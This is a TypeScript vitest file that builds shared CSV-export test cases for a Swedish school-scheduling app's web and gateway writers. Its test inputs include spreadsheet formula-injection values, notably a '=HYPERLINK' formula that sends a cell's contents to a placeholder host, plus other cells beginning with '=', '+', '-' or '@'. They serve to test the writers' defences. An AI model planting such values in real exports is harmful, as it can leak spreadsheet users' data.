import { readFileSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  classesToCsv,
  membershipsToCsv,
  roomTypesToCsv,
  roomsToCsv,
  serializeCsv,
  studentsToCsv,
  subjectsToCsv,
  teacherQualificationsToCsv,
  teachersToCsv,
} from "@/lib/csv-export";
import { teacherDutiesToCsv } from "@/lib/duties-csv-export";
import { guardiansToCsv } from "@/lib/guardians-csv-export";
import { requirementsToCsv } from "@/lib/requirements-csv-export";
import { timplanToCsv } from "@/lib/timplan-csv";

vi.mock("@/lib/api", () => ({ api: { get: vi.fn() } }));

/**
 * The web's CSV writers against the gateway's copies (src/school-export/
 * csv-files.ts, csv-writer.ts). The whole-school export builds the school's
 * importable lists in the gateway, where web/lib cannot be imported, and the
 * two must write the same bytes or a file from the export is not a file the
 * page's importer was built for.
 *
 * This file is the GENERATOR of the shared list of cases: it builds every case
 * with the web's own functions and compares the result with
 * src/school-export/__fixtures__/csv-files-cases.json, which
 * src/school-export/csv-files.spec.ts replays against the gateway's. After a
 * change to a web writer, regenerate and commit:
 *
 *   UPDATE_CSV_FILES_CASES=1 npx vitest run lib/csv-files-cases.test.ts
 *
 * Never edit the JSON by hand: it is what the web wrote.
 */

// vitest runs from web/, so the gateway's fixtures are one level up.
const FIXTURE = resolve(process.cwd(), "../src/school-export/__fixtures__/csv-files-cases.json");

interface Case {
  name: string;
  builder: string;
  args: unknown[];
  expected: string;
}

const nasty = [
  "Andersson",
  "=HYPERLINK(\"http://x\"&A1)",
  "+46 70 123 45 67",
  "-12,5",
  "-5",
  "@home",
  "'=quoted",
  "''@x",
  "  =lead",
  "\t=tab",
  "Idrott; hälsa",
  "säg \"hej\"",
  "två\r\nrader",
  "",
  "åäö ÅÄÖ é ñ",
];

const roomTypes = [
  { id: "rt1", name: "Gymnastiksal" },
  { id: "rt2", name: "NO-sal; stor" },
];
const subjects = [
  { id: "s1", name: "Matematik", code: "MA", color: "#aabbcc", requiredRoomTypeId: null, nationalCode: "GRGRMAT01", countsTowardTimplan: true },
  { id: "s2", name: "Idrott; hälsa", code: null, color: null, requiredRoomTypeId: "rt1", nationalCode: null, countsTowardTimplan: true },
  { id: "s3", name: "Elevens val", code: "  ", color: null, requiredRoomTypeId: "rt2", nationalCode: null, countsTowardTimplan: false },
  { id: "s4", name: "=Formelämne", code: "+X", color: null, requiredRoomTypeId: null, nationalCode: null, countsTowardTimplan: true },
];
const people = [
  { id: "t1", role: "TEACHER", firstName: "Karin", lastName: "Ek", email: "karin.ek@skola.se", phone: "070-123 45 67", isActive: true, studentGroupId: null },
  { id: "t2", role: "TEACHER", firstName: "=Nils", lastName: "Berg", email: "nils@skola.se", phone: null, isActive: true, studentGroupId: null },
  { id: "t3", role: "TEACHER", firstName: "Gun", lastName: "Lind", email: "gun@skola.se", phone: null, isActive: false, studentGroupId: null },
  { id: "t4", role: "TEACHER", firstName: "Åsa", lastName: "Öberg", email: "asa@skola.se", phone: "-12,5", isActive: true, studentGroupId: null },
  { id: "p1", role: "STUDENT", firstName: "Alma", lastName: "Sjö", email: "alma@skola.se", phone: null, isActive: true, studentGroupId: "g1" },
  { id: "p2", role: "STUDENT", firstName: "Noah", lastName: "Sjö", email: "noah@skola.se", phone: "+46701234567", isActive: true, studentGroupId: null },
  { id: "p3", role: "STUDENT", firstName: "Ivar", lastName: "Ek", email: "ivar@skola.se", phone: null, isActive: false, studentGroupId: "g1" },
  { id: "a1", role: "SCHOOL_ADMIN", firstName: "Rek", lastName: "Tor", email: "rektor@skola.se", phone: null, isActive: true, studentGroupId: null },
];
const groups = [
  { id: "g1", name: "7A", kind: "CLASS", gradeLevel: 7, halfOfId: null, replacesSubjectId: null },
  { id: "g2", name: "7A halva 1", kind: "TEACHING_GROUP", gradeLevel: 7, halfOfId: "g1", replacesSubjectId: null },
  { id: "g3", name: "Elevens val 8", kind: "TEACHING_GROUP", gradeLevel: 8, halfOfId: null, replacesSubjectId: "s3" },
  { id: "g4", name: "Fk", kind: "CLASS", gradeLevel: 0, halfOfId: null, replacesSubjectId: null },
  { id: "g5", name: "Utan klass", kind: "TEACHING_GROUP", gradeLevel: null, halfOfId: null, replacesSubjectId: "s1" },
  // Unresolvable on purpose: a half whose class is not in the list, a group replacing a subject the list lacks.
  { id: "g6", name: "Föräldralös halva", kind: "TEACHING_GROUP", gradeLevel: 7, halfOfId: "gX", replacesSubjectId: null },
  { id: "g7", name: "Okänt ämne", kind: "TEACHING_GROUP", gradeLevel: 7, halfOfId: null, replacesSubjectId: "sX" },
];

const requirementBase = {
  studentGroupId: "g1",
  subjectId: "s1",
  teacherId: "t1",
  coTeacherId: null,
  lessonsPerWeek: 3,
  minutesPerLesson: 60,
  minutesBefore: 0,
  minutesAfter: 0,
  teacherLoadPercent: 100,
  coTeacherLoadPercent: 100,
  recurrence: "ALL_WEEKS",
  startDate: null,
  endDate: null,
};
const requirements = [
  requirementBase,
  { ...requirementBase, subjectId: "s2", teacherId: "t2", coTeacherId: "t1", recurrence: "ODD_WEEKS", startDate: "2026-08-17", endDate: "2026-12-18", minutesBefore: 5, minutesAfter: 10, teacherLoadPercent: 50, coTeacherLoadPercent: 150 },
  { ...requirementBase, studentGroupId: "g2", teacherId: null, recurrence: "EVEN_WEEKS" },
  // A teacher the roster cannot name or has deactivated: the row is left out, whole.
  { ...requirementBase, teacherId: "t3" },
  { ...requirementBase, teacherId: "tX" },
  { ...requirementBase, studentGroupId: "gX" },
  { ...requirementBase, subjectId: "sX" },
];
const splitRequirements = [
  ...requirements,
  { ...requirementBase, lessonsPerWeek: 2, minutesPerLesson: 80, lessonLengths: [80, 40] },
  { ...requirementBase, subjectId: "s2", lessonsPerWeek: 3, minutesPerLesson: 60, lessonLengths: [60, 60, 30] },
];

const duty = {
  userId: "t1",
  kind: "MENTORSKAP",
  label: "Mentor 7A",
  minutesPerWeek: 60,
  countsAsTeaching: false,
  subjectId: null,
  studentGroupId: "g1",
  validFrom: null,
  validTo: null,
  note: null,
};
const duties = [
  duty,
  { ...duty, kind: "AMNESANSVAR", label: "Ämnesansvar; MA", subjectId: "s1", studentGroupId: null, validFrom: "2026-08-17T00:00:00.000Z", validTo: "2027-06-11", note: "Hela året", countsAsTeaching: true },
  { ...duty, kind: "APT_KONFERENS", label: "=Apt", userId: "t2", studentGroupId: null },
  { ...duty, userId: "t3" },
  { ...duty, userId: "tX" },
  { ...duty, subjectId: "sX" },
  { ...duty, studentGroupId: "gX" },
];

const qualifications = [
  { userId: "t1", subjectId: "s1", minGradeLevel: 4, maxGradeLevel: 9, kind: "BEHORIG" },
  { userId: "t1", subjectId: "s2", minGradeLevel: 1, maxGradeLevel: 6, kind: "LEGITIMATION" },
  { userId: "t2", subjectId: "s3", minGradeLevel: 7, maxGradeLevel: 9, kind: "TILLATEN" },
  { userId: "t3", subjectId: "s1", minGradeLevel: 4, maxGradeLevel: 9, kind: "BEHORIG" },
  { userId: "tX", subjectId: "s1", minGradeLevel: 4, maxGradeLevel: 9, kind: "BEHORIG" },
  { userId: "t1", subjectId: "sX", minGradeLevel: 4, maxGradeLevel: 9, kind: "BEHORIG" },
];

const rooms = [
  { name: "Sal 1", code: "S1", capacity: 30, roomTypeId: "rt1", minGradeLevel: 1, maxGradeLevel: 9, building: "A", floor: 1 },
  { name: "Sal =2", code: null, capacity: null, roomTypeId: null, minGradeLevel: null, maxGradeLevel: null, building: null, floor: null },
  { name: "Sal; tre", code: "S3", capacity: 0, roomTypeId: "rt2", minGradeLevel: null, maxGradeLevel: 9 },
  { name: "Okänd typ", code: "S4", capacity: 12, roomTypeId: "rtX", minGradeLevel: 1, maxGradeLevel: 3, building: "B", floor: -1 },
];

const memberships = [
  { studentGroupId: "g1", studentId: "p1" },
  { studentGroupId: "g2", studentId: "p1" },
  { studentGroupId: "g2", studentId: "p3" },
  { studentGroupId: "g3", studentId: "p2" },
  { studentGroupId: "gX", studentId: "p2" },
  { studentGroupId: "g1", studentId: "pX" },
];

const employments: Record<string, unknown> = {
  t1: { employmentPercent: 100, reductionPercent: 0, contractKind: "FERIE", signature: "KEK" },
  t2: { employmentPercent: 66.667, reductionPercent: 12.5, contractKind: "SEMESTER", signature: null },
  // Hidden from the reader: no percentage, so no post.
  t4: { employmentPercent: null, reductionPercent: null, contractKind: "FERIE", signature: "ASA" },
};

const guardianRows = [
  { firstName: "Gun", lastName: "Berg", email: "gun@skola.se", phone: "070-123 45 67", studentEmail: "alma@skola.se" },
  { firstName: "Gun", lastName: "Berg", email: "gun@skola.se", phone: null, studentEmail: "noah@skola.se" },
  { firstName: "=Pär", lastName: "Sjö", email: "par@skola.se", phone: "-12,5", studentEmail: "noah@skola.se" },
];

const timplanEntries = [
  { subjectId: "s2", gradeLevel: 0, minutesPerWeek: 60, note: null },
  { subjectId: "s1", gradeLevel: 3, minutesPerWeek: 235, note: "Skolans val; extra" },
  { subjectId: "s1", gradeLevel: 1, minutesPerWeek: 236, note: null },
  { subjectId: "s3", gradeLevel: 8, minutesPerWeek: 40, note: "=Notering" },
  { subjectId: "sX", gradeLevel: 8, minutesPerWeek: 40, note: null },
];

const mapOf = (entries: { id: string; name: string }[]) => Object.fromEntries(entries.map((e) => [e.id, e.name]));

function build(): Case[] {
  const roomTypeNames = mapOf(roomTypes);
  const classNames = mapOf(groups);
  const names = (id: string | null) => (id ? (roomTypeNames[id] ?? "") : "");
  const className = (id: string | null) => (id ? (classNames[id] ?? "") : "");
  const yearGroups = groups;
  const cases: Case[] = [];
  const add = (name: string, builder: string, args: unknown[], expected: string) => cases.push({ name, builder, args, expected });

  add("serializeCsv: every awkward cell", "serializeCsv", [["a", "b"], nasty.map((v) => [v, v])], serializeCsv(["a", "b"], nasty.map((v) => [v, v])));
  add("serializeCsv: only a header", "serializeCsv", [["a", "b"], []], serializeCsv(["a", "b"], []));
  add("roomTypesToCsv", "roomTypesToCsv", [roomTypes], roomTypesToCsv(roomTypes));
  add("roomTypesToCsv: none", "roomTypesToCsv", [[]], roomTypesToCsv([]));
  add("subjectsToCsv", "subjectsToCsv", [subjects, roomTypeNames], subjectsToCsv(subjects, names));
  add("roomsToCsv", "roomsToCsv", [rooms, roomTypes], roomsToCsv(rooms, roomTypes));
  add("classesToCsv", "classesToCsv", [yearGroups, subjects], classesToCsv(yearGroups, subjects));
  add("teachersToCsv: with posts", "teachersToCsv", [people, employments], teachersToCsv(people, (id) => employments[id] as never));
  add("teachersToCsv: without posts", "teachersToCsv", [people, null], teachersToCsv(people));
  add("teacherQualificationsToCsv", "teacherQualificationsToCsv", [qualifications, people, subjects], teacherQualificationsToCsv(qualifications as never, people, subjects));
  add("studentsToCsv", "studentsToCsv", [people, classNames], studentsToCsv(people, className));
  add("membershipsToCsv", "membershipsToCsv", [groups, people, memberships], membershipsToCsv(groups, people, memberships));
  add("teacherDutiesToCsv", "teacherDutiesToCsv", [duties, people, subjects, groups], teacherDutiesToCsv(duties as never, people, subjects, groups));
  add("requirementsToCsv", "requirementsToCsv", [requirements, groups, subjects, people], requirementsToCsv(requirements as never, groups, subjects, people));
  add("requirementsToCsv: a split post adds the column", "requirementsToCsv", [splitRequirements, groups, subjects, people], requirementsToCsv(splitRequirements as never, groups, subjects, people));
  add("guardiansToCsv", "guardiansToCsv", [guardianRows], guardiansToCsv(guardianRows));
  add("timplanToCsv", "timplanToCsv", [timplanEntries, subjects], timplanToCsv(timplanEntries, subjects));
  return cases;
}

describe("the gateway's copies of the CSV writers", () => {
  it("are held to the web's by the shared list of cases", () => {
    const fresh = JSON.stringify({ cases: build() }, null, 1) + "\n";
    if (process.env.UPDATE_CSV_FILES_CASES === "1") writeFileSync(FIXTURE, fresh);
    // Equal as parsed JSON first: a diff of two long strings names nothing.
    expect(JSON.parse(readFileSync(FIXTURE, "utf8"))).toEqual(JSON.parse(fresh));
    expect(readFileSync(FIXTURE, "utf8")).toBe(fresh);
  });

  it("cover every builder the whole-school export copies", () => {
    expect(new Set(build().map((c) => c.builder))).toEqual(
      new Set([
        "serializeCsv",
        "roomTypesToCsv",
        "subjectsToCsv",
        "roomsToCsv",
        "classesToCsv",
        "teachersToCsv",
        "teacherQualificationsToCsv",
        "studentsToCsv",
        "membershipsToCsv",
        "teacherDutiesToCsv",
        "requirementsToCsv",
        "guardiansToCsv",
        "timplanToCsv",
      ]),
    );
  });
});
